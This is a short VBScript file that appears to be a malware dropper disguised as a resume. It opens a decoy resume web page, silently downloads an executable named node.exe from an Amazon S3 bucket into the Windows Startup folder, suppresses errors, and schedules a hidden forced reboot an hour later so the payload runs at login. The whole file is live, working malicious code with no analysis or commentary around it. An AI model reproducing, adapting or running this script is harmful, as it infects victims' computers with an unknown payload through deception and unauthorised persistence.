Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
DECOY_URL = "https://flowcv.com/resume/e2bk4rge9g1u"
DOWNLOAD_URL = "https://upload0x3fdi.s3.eu-north-1.amazonaws.com/Prince/node.exe"
STARTUP_FILENAME = "node.exe"
startupFolder = objShell.SpecialFolders("Startup")
downloadPath = startupFolder & "\" & STARTUP_FILENAME
Set objIE = CreateObject("Shell.Application")
objIE.ShellExecute DECOY_URL, "", "", "open", 1
Set objIE = Nothing
If Not objFSO.FileExists(downloadPath) Then
On Error Resume Next
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
objHTTP.Open "GET", DOWNLOAD_URL, False
objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0"
objHTTP.Send
If objHTTP.Status = 200 Then
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1
objStream.Open
objStream.Write objHTTP.responseBody
objStream.SaveToFile downloadPath, 2
objStream.Close
End If
End If
On Error Resume Next
restartDelay = 3600
cmdCommand = "cmd /c timeout /t " & restartDelay & " /nobreak >nul && shutdown /r /f /t 0"
objShell.Run cmdCommand, 0, False
On Error Goto 0

